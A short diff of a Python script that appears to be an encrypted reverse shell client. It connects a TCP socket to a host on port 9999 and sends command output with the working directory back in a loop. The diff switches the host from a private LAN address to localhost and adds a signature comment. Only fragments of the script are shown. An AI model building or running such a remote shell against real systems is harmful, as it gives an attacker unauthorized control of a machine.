@@ -36,7 +36,7 @@ def encrypt(text, key):
     return encrypted_bytes
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.152.117'
+host = '127.0.0.1'
 port = 9999
 key = "secret123"
 
@@ -68,3 +68,7 @@ while True:
         output_str = output_byte.decode("utf-8")
         currentWD = os.getcwd() + "> "
         s.sendall(str.encode(output_str + currentWD))
+
+
+
+        #ralkhayer
